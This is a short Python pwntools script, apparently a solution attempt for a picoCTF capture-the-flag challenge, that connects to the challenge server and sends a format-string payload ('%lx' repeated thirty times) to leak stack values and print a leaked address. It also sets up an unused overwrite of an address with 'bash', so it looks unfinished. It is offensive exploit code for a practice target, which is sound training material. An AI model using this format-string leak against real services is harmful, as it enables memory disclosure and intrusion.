#!/usr/bin/env python3
from pwn import *
from pwnlib.fmtstr import fmtstr_payload
write_address = 0x404018

context.binary = bin = ELF(f"vuln")

run_remote = True

HOST = "mercury.picoctf.net"
PORT = 57985

date_addr = 0x400d3a

write = {date_addr: b"bash"}

with (remote(HOST, PORT) if run_remote else process([bin.path])) as r:
    print(r.recv().decode())
    r.send(b"1\n")
    print(r.recv().decode())
    r.send(b"%lx&&" * 30 + b"\n")
    resp = r.recvall().decode()
    print(resp)
    portfolio_addr_in_hex = resp.split("&&")[17]
    print(f"Address of portfolio 0x{portfolio_addr_in_hex}")
